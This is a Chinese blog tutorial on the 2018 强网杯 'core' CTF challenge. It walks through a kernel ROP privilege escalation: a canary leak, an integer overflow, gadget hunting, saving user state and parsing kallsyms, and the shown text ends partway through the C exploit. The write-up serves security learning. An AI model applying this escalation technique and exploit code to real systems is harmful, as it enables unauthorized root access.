

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="peiwithhao">
  <meta name="keywords" content="">
  
    <meta name="description" content="针对不同内核漏洞的n种提权方案">
<meta property="og:type" content="article">
<meta property="og:title" content="Linux-Kernel-0x02-Practice">
<meta property="og:url" content="https://peiandhao.github.io/2023/06/24/Linux-Kernel-0x02-Practice/index.html">
<meta property="og:site_name" content="peiwithhao&#39;s Valhalla">
<meta property="og:description" content="针对不同内核漏洞的n种提权方案">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://peiandhao.github.io/img/Linux_Kernel.png">
<meta property="article:published_time" content="2023-06-24T12:59:35.000Z">
<meta property="article:modified_time" content="2023-10-09T03:47:33.107Z">
<meta property="article:author" content="peiwithhao">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="kernel">
<meta property="article:tag" content="ctf">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://peiandhao.github.io/img/Linux_Kernel.png">
  
  
  
  <title>Linux-Kernel-0x02-Practice - peiwithhao&#39;s Valhalla</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"peiandhao.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"text"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"Afm6UeM0VL6RfMOLAgwtyxs8-gzGzoHsz","app_key":"Vr60qrZIptqhJaXqWvDEknkH","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>p3ivv1+h@0</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/Linux_Kernel.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Linux-Kernel-0x02-Practice"></span>
          
        </div>

        
          
  <div class="mt-3">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-author" aria-hidden="true"></i>
        peiwithhao
      </span>
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-06-24 20:59" pubdate>
          2023年6月24日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          184k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          <!-- compatible with older versions-->
          1535 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">Linux-Kernel-0x02-Practice</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="一-、Kernel-ROP"><a href="#一-、Kernel-ROP" class="headerlink" title="一 、Kernel ROP"></a>一 、Kernel ROP</h1><p>其大致思想类似于<code>userland</code>部分的ROP，唯一区别就是咱们需要注意现场的保存与还原即可:)</p>
<h2 id="例题：强网杯2018-core"><a href="#例题：强网杯2018-core" class="headerlink" title="例题：强网杯2018 - core"></a>例题：强网杯2018 - core</h2><h3 id="0-反编译代码分析"><a href="#0-反编译代码分析" class="headerlink" title="0. 反编译代码分析"></a>0. 反编译代码分析</h3><p>文件里面包含了这几个文件<br>        <code>bzImage</code>,<code>core.cpio</code>,<code>start.sh</code>,<code>vmlinux</code><br>先看看start.sh</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">qemu-system-x86_64 \<br>-m <span class="hljs-number">128</span>M \<br>-kernel ./bzImage \<br>-initrd  ./core.cpio \<br>-append <span class="hljs-string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \<br>-s \<br>-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \<br>-nographic  \<br></code></pre></td></tr></table></figure>


<p>可以看到咱们这儿题目采用了kaslr ，有地址随机，所以咱们需要泄露地址，大致思路和用户态一致。这里还注意那就是从ctfwiki上面下载下来的题目是-m 64M,这里会出现运行不了虚拟机的情况，所以咱们改为128M即可，这是内存大小的定义，太小了跑不动。</p>
<p>之后咱们再看看文件系统解压后得到的init脚本</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c">#!/bin/sh<br>mount -t proc proc /proc<br>mount -t sysfs sysfs /sys<br>mount -t devtmpfs none /dev<br>/sbin/mdev -s<br>mkdir -p /dev/pts<br>mv <span class="hljs-built_in">exp</span>.c /<br>mount -vt devpts -o gid=<span class="hljs-number">4</span>,mode=<span class="hljs-number">620</span> none /dev/pts<br>chmod <span class="hljs-number">666</span> /dev/ptmx<br>cat /proc/kallsyms &gt; /tmp/kallsyms<br>echo <span class="hljs-number">1</span> &gt; /proc/sys/kernel/kptr_restrict<br>echo <span class="hljs-number">1</span> &gt; /proc/sys/kernel/dmesg_restrict<br>ifconfig eth0 up<br>udhcpc -i eth0<br>ifconfig eth0 <span class="hljs-number">10.0</span><span class="hljs-number">.2</span><span class="hljs-number">.15</span> netmask <span class="hljs-number">255.255</span><span class="hljs-number">.255</span><span class="hljs-number">.0</span><br>route add <span class="hljs-keyword">default</span> gw <span class="hljs-number">10.0</span><span class="hljs-number">.2</span><span class="hljs-number">.2</span> <br>insmod /core.ko<br><span class="hljs-meta">#setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br><br>poweroff -d <span class="hljs-number">120</span> -f &amp;<br>setsid /bin/cttyhack setuidgid <span class="hljs-number">1000</span> /bin/sh<br>echo <span class="hljs-string">&#x27;sh end!\n&#x27;</span><br>umount /proc<br>umount /sys<br><br>poweroff -d <span class="hljs-number">0</span>  -f<br></code></pre></td></tr></table></figure>



<p>从中我们可以看到文件系统中insmod了一个core.ko，一般来讲这就是漏洞函数了，还有咱们可以添加<code>setsid /bin/cttyhack setuidgid 0 /bin/sh</code>这一句来使得我们进入虚拟机的时候就是root权限，大伙不必惊慌，这里是因为咱们是再本地需要进行调试，所以init脚本任我们改，start脚本也是，咱们可以直接把kalsr关了也行，但关了并不代表咱们不管，咱们这一举动主要是为了方便调试的，最终打远程还是人家说了算，咱们值有一个exp能提交。<br>接着分析init，这里还发现开始时内核符号表被复制了一份到<code>/tmp/kalsyms</code>中，利用这个我们可以获得内核中所有函数的地址，还有个恶心的地方那就是这里开启了定时关机，咱们可以把这给先注释掉<br><code>poweroff -d 120 -f &amp;</code></p>
<p>进入漏洞模块的分析</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/42166d224f4a20a438bb7e05d5529822730ed04f.jpg" srcset="/img/loading.gif" lazyload></p>
<p>这里可以看到有canary和NX，所以咱们通过ROP的话需要进行canary泄露。<br>接下来咱们分析相关函数init_moddule</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/a9d3fd1f4134970ac9d052edd0cad1c8a6865d55.jpg" srcset="/img/loading.gif" lazyload></p>
<p>可以看到模块加载的初期会创建一个名为<code>core</code>的进程，在虚拟机中在&#x2F;proc目录下<br>在看看比较重要的ioctl函数</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/77c6a7efce1b9d162f5ed8a3b6deb48f8d546453.jpg" srcset="/img/loading.gif" lazyload></p>
<p>可以看出有三个模式选择，分别点入相关函数看</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/77094b36acaf2edd18640b2bc81001e93801935f.jpg" srcset="/img/loading.gif" lazyload></p>
<p>这里的read函数就是向用户指定的地址从off偏移地址写入64个字节.<br>而从ioctl中第二个case可以看到咱们居然可以设置off，所以我们可以通过设置偏移来写入canary的值，而我们从ida中可以看到咱们的canary是位于这里</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/a5c27d1ed21b0ef40362da9c98c451da80cb3e6d.jpg" srcset="/img/loading.gif" lazyload></p>
<p>可以知道相差对于v5相差0x40，所以咱们设置的off也是0x40</p>
<p>我们还可以来看看file_operations,(不秦楚的大伙可以看看我的上一篇环境搭建的文章)，可以看到他只实现了write，ioctl，release的系统调用：</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/50da81cb39dbb6fd4da7a7e44c24ab18962b3777.jpg" srcset="/img/loading.gif" lazyload></p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/6d81800a19d8bc3e40f74408c78ba61ea9d34571.jpg" srcset="/img/loading.gif" lazyload></p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/7aec54e736d12f2e7ffceca20ac2d56284356873.jpg" srcset="/img/loading.gif" lazyload></p>
<p>我们再来看看其他函数，先看core_write</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/8694a4c27d1ed21b193c6c27e86eddc450da3f7e.jpg" srcset="/img/loading.gif" lazyload><br>这里可以知道他总共可以向name这个地址写入0x800个字节，心动<br>我们再来看看ioctl中第三个选项的core_copy_func</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/810a19d8bc3eb135c137f579e31ea8d3fc1f4404.jpg" srcset="/img/loading.gif" lazyload><br>发现他可以从name上面拷贝数据到达栈上，然后这个判断存在着整形溢出，这里如果咱传个负数就可以达成效果了。</p>
<p>既然咱们可以在栈上做手脚，那么我们就可以利用ROP的方式了，首先找几个gadget，这里的gadget是需要在vmlinux中寻找，我的推荐是用</p>
<pre><code class="hljs">objdump -d ./vmlinux &gt; ropgadget \
cat ropgadget | grep &quot;pop rdi; ret&quot;
</code></pre>
<p>这样的类型进行寻找</p>
<h3 id="1-寻找gadget"><a href="#1-寻找gadget" class="headerlink" title="1.寻找gadget"></a>1.寻找gadget</h3><p>如图：<br>对于上面所说的比较关键的两个函数<code>commit_creds</code>以及<code>prepare_kernel_cred</code>,我们在vmlinux中去寻找他所加载的的地址<br>然后我们可以看看ropgadget文件<br><img src="http://imgsrc.baidu.com/super/pic/item/aec379310a55b319d78ccdb706a98226cefc17fe.jpg" srcset="/img/loading.gif" lazyload><br>从中咱们可以看到其中即我们所需要的gadget(实际上就是linux内核镜像所使用的汇编代码)，此时我们再通过linux自带的grep进行搜索，个人认为还是比较好用的，用<code>ropgadget</code>或者是<code>ropper</code>来说都可以，看各位师傅的喜好来.具体使用情况如下：<br><img src="http://imgsrc.baidu.com/super/pic/item/b8389b504fc2d562427a9f2fa21190ef77c66c86.jpg" srcset="/img/loading.gif" lazyload><br>以此手法获得两个主要函数的地址后，此刻若咱们在exp中获得这两个函数的实际地址，然后将两者相减即可得到KASLR的偏移地址。<br>自此咱们继续搜索别的gadget，我们此刻需要的gadget共有如下几个：</p>
<pre><code class="hljs">swapgs; popfq;  ret;
mov rdi, rax;  call rdx; 
pop rdx; ret;  
pop rdi; ret;   
pop rcx; ret; 
iretq
</code></pre>
<p>师傅们可以用上述方法自行寻找.</p>
<h3 id="2-自行构造返回状态"><a href="#2-自行构造返回状态" class="headerlink" title="2. 自行构造返回状态"></a>2. 自行构造返回状态</h3><p>虽然咱们的<strong>提权</strong>是在内核态当中，但我们最终还是需要返回用户态来得到一个root权限的shell，所以当我们进行栈溢出rop之后还需要利用swapgs等保存在内核栈上的寄存器值返回到应得的位置，但是如何保证返回的时候不出错呢，对，那就只能在调用内核态的时候将即将保存的正确的寄存器值先保存在咱们自己申请的值里面，这样就方便咱们在rop链结尾填入他们实现返回不报错。既然涉及到了保存值，那我们就需要内嵌汇编代码来实现此功能，代码如下，这也可以视为一个通用代码；</p>
<pre><code class="hljs">size_t user_cs, user_ss,user_rflags,user_sp;

//int fd = 0;        // file pointer of process &#39;core&#39;

void saveStatus()&#123;
  __asm__(&quot;mov user_cs, cs;&quot;
          &quot;mov user_ss, ss;&quot;
          &quot;mov user_sp, rsp;&quot;
          &quot;pushf;&quot;
          &quot;pop user_rflags;&quot;
          );
  puts(&quot;\033[34m\033[1m Status has been saved . \033[0m&quot;);
&#125;
</code></pre>
<p>大伙学到了内核pwn，那汇编功底自然不必说，我就不解释这段代码功能了。</p>
<h3 id="3-攻击思路"><a href="#3-攻击思路" class="headerlink" title="3. 攻击思路"></a>3. 攻击思路</h3><p>现在开始咱们的攻击思路思考，在上面介绍各个函数的时候我也稍微讲了点。我们所做的事主要如下：</p>
<blockquote>
<ol>
<li><p>利用ioctl中的选项2.修改off为0x40</p>
</li>
<li><p>利用core_read,也就是ioctl中的选项1,可将局部变量v5的off偏移地址打印,经过调试可发现这里即为canary</p>
</li>
<li><p>当咱们打印了canary,现在即可进行栈溢出攻击了,但是溢出哪个栈呢,我们发现ioctl的第三个选项中调用的函数 <code>core_copy_func</code>,会将bss段上的name输入在栈上,输入的字节数取决于咱们传入的数字,并且此时他又整型溢出漏洞,好,就决定冤大头是他了</p>
</li>
<li><p>core.ko 所实现的系统调用write可以发现其中可以将我们传入的值写到bss段中的name上面,天助我也,所以咱们就可以在上面适当的构造rop链进行栈溢出了</p>
</li>
</ol>
</blockquote>
<p>大伙看到这里是不是觉得有点奇怪,欸,刚才不是说要泄露地址码,这兄弟是不是讲错了,就这?大家不要慌,我这正要讲解,从上面的init脚本中我们可以看到这一句:</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/proc/</span>kallsyms &gt; <span class="hljs-regexp">/tmp/</span>kallsyms<br></code></pre></td></tr></table></figure>

<p>其中 &#x2F;proc&#x2F;kallsyms中包含了内核中所有用到的符号表,而处于用户态的我们是不能访问的,所以出题人贴心的将他输出到了&#x2F;tmp&#x2F;kallsyms中,这就使得我们在用户态也依然可以访问了,所以我们还得在exp中写一个文件遍历的功能,当然这对于学过系统编程的同学并不在话下,(可是我上这课在划水….)<br>这里贴出代码给大伙先看看</p>
<pre><code class="hljs">void get_function_address()&#123;
        FILE* sym_table = fopen(&quot;/tmp/kallsyms&quot;, &quot;r&quot;);        // including all address of kernel functions,just like the user model running address.
        if(sym_table == NULL)&#123;
                printf(&quot;\033[31m\033[1m[x] Error: Cannot open file \&quot;/tmp/kallsyms\&quot;\n\033[0m&quot;);
                exit(1);
        &#125;
        size_t addr = 0;
        char type[0x10];
        char func_name[0x50];
        // when the reading raises error, the function fscanf will return a zero, so that we know the file comes to its end.
        while(fscanf(sym_table, &quot;%llx%s%s&quot;, &amp;addr, type, func_name))&#123;
                if(commit_creds &amp;&amp; prepare_kernel_cred)                // two addresses of key functions are all found, return directly.
                        return;
                if(!strcmp(func_name, &quot;commit_creds&quot;))&#123;                // function &quot;commit_creds&quot; found
                        commit_creds = addr;
                        printf(&quot;\033[32m\033[1m[+] Note: Address of function \&quot;commit_creds\&quot; found: \033[0m%#llx\n&quot;, commit_creds);
                &#125;else if(!strcmp(func_name, &quot;prepare_kernel_cred&quot;))&#123;
                        prepare_kernel_cred = addr;
                        printf(&quot;\033[32m\033[1m[+] Note: Address of function \&quot;prepare_kernel_cred\&quot; found: \033[0m%#llx\n&quot;, prepare_kernel_cred);
                &#125;
        &#125;

&#125;
</code></pre>
<p>当知道exp思路之后,其他的一切就简单起来,只需要看懂他然后实现即可.</p>
<h3 id="4-gbb调试qemu中内核基本方法"><a href="#4-gbb调试qemu中内核基本方法" class="headerlink" title="4. gbb调试qemu中内核基本方法"></a>4. gbb调试qemu中内核基本方法</h3><p>众所周知,调试在pwn中是十分重要的,特别是动调,所以这里介绍下gdb调试内核的方法<br>由于咱们的内核是跑在qemu中,所以我们gdb需要用到远程调试的方法,但是如果直接连端口的话会出现没符号表不方便调试的,所以我们需要自行导入内核模块,也就是文件提供的<code>vmlinux</code>,之后由于咱们还需要core.ko的符号表,所以咱们也可以通过自行导入来获得可以,通过 <code>add-symbol-file core.ko textaddr</code> 加载 ,而这里的<code>textaddr</code>即为<code>core.ko</code>的<code>.text</code>段地址,我们可以通过修改<code>init</code>中为<code>root</code>权限进行设置.<br>这里.text 段的地址可以通过 <code>/sys/modules/core/section/.text</code> 来查看，<br>这里强烈建议大伙先关kaslr(通过在启动脚本修改,就是将kaslr改为nokaslr)再进行调试,效果图如下</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/5882b2b7d0a20cf48316b11d33094b36adaf996a.jpg" srcset="/img/loading.gif" lazyload><br>我们可以通过<code>-gdb tcp:port</code>或者 <code>-s </code>来开启调试端口，<code>start.sh</code> 中已经有了 -s，不必再自己设置。(对了如果-s ,他的功能等同于-gdb tcp:1234)<br>在我们获得.text基地址后记得用脚本来开gdb,不然每次都要输入这么些个东西太麻烦了,脚本如下十分简单:</p>
<pre><code class="hljs">#!/bin/bash
gdb -q \
  -ex &quot;&quot; \
  -ex &quot;file ./vmlinux&quot; \
  -ex &quot;add-symbol-file ./extract/core.ko 0xffffffffc0000000&quot; \
  -ex &quot;b core_copy_func&quot; \
  -ex &quot;target remote localhost:1234&quot; \
</code></pre>
<p>其中打断点可以先打在core_read,这里打在core_copy_func是我调到尾声修改的.这里还注意一个点,就是当采用pwndbg的时侯需要root权限才可以进行调试不然会出现以下错误</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/77094b36acaf2edd1b05062bc81001e938019378.jpg" srcset="/img/loading.gif" lazyload><br>最开始气死我了,人家peda都不要root,但是最开始不清楚为什么会错,我还以为是版本问题,但想到这是我最近刚配的一台机子又应该不是,其实最开始看到permission就该想到的,害.<br>我们用root权限进行开调</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/0824ab18972bd40717299c3f3e899e510eb30901.jpg" srcset="/img/loading.gif" lazyload alt="aa"><br>可以看到十分的成功,此刻我continue,还记得咱们下的断电码,b core_read,如果咱们调用它后咱们就会在这里停下来,此刻我们运行咱们的程序试试</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/b7003af33a87e950aaf6bcae55385343faf2b40b.jpg" srcset="/img/loading.gif" lazyload><br>这样咱们就可以愉快的进行调试啦,至此gdb调试内核基本方法到此结束~~~</p>
<h3 id="5-ROP链解析"><a href="#5-ROP链解析" class="headerlink" title="5. ROP链解析"></a>5. ROP链解析</h3><p>这里简单讲讲,直接给图</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/7c1ed21b0ef41bd5b84aa63614da81cb38db3dd2.jpg" srcset="/img/loading.gif" lazyload><br>相信大家理解起来不费力.</p>
<h3 id="6-exp"><a href="#6-exp" class="headerlink" title="6. exp"></a>6. exp</h3><p>本次exp如下,大伙看看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>;        <span class="hljs-comment">// address of to key function</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_POPFQ_RET 0xffffffff81a012da</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDX_RET 0xffffffff810a0f49</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff81000b2f  </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RCX_RET 0xffffffff81021e53</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IRETQ 0xffffffff81050ac2 </span><br><span class="hljs-type">size_t</span> user_cs, user_ss,user_rflags,user_sp;<br><br><span class="hljs-comment">//int fd = 0;        // file pointer of process &#x27;core&#x27;</span><br><br><span class="hljs-comment">/*void saveStatus();</span><br><span class="hljs-comment">void get_function_address();</span><br><span class="hljs-comment">#void core_read(int fd, char* buf);</span><br><span class="hljs-comment">void change_off(int fd, long long off);</span><br><span class="hljs-comment">void core_copy_func(int fd, long long nbytes);</span><br><span class="hljs-comment">void print_binary(char* buf, int length);</span><br><span class="hljs-comment">void shell();</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span>&#123;<br>  __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>          <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>          <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>          <span class="hljs-string">&quot;pushf;&quot;</span><br>          <span 